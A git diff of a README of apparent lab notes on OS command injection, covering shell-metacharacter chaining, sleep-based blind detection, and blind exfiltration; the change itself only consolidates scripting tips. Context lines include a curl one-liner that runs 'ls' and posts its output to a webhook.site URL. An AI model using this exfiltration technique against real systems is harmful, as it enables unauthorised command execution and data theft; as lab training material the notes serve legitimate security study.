@@ -33,15 +33,11 @@ Directly executed using eval and the entire raw output is displayed back.
 Can just chain commmand we want to run using shell meta characters and end with '#'(for BASH) to prevent 
 interference with remaining part of the script running the commands. With this we can run anything as we can get path names,file names anything as output displayed.
 
-Script Note:
-Try to output useful error messages if script fails for some reason.
 
 <h1>Lab2 Simple Blind</h1>
 Just used sleep on different parameters you control to check which one delays response and that is then confirmed to be vulnerable.
 
-Script Note:
-Check for auth tokens and get them before sending actual request.
-Can set proxy to BURP interceptor ~~so that can record the responses and know if it worked or not~~ or just print the response text in the script.
+
 
 
 <h1>Lab3&4&5 Blind Redirection</h1>
@@ -53,3 +49,8 @@ If need output of a command and its blind injection:
 Eg: ```dir=$(ls); curl -s -X POST https://webhook.site/f3082654-6152-471b-b960-48dfd6fce02f --data-raw $dir```
 
 ![Webhook example](webhook.png)
+
+<h2>Scripting Note:</h2>
+Try to output useful error messages if script fails for some reason.
+Check for auth tokens and get them before sending actual request.
+Can set proxy to BURP interceptor ~~so that can record the responses and know if it worked or not~~ or just print the response text in the script.
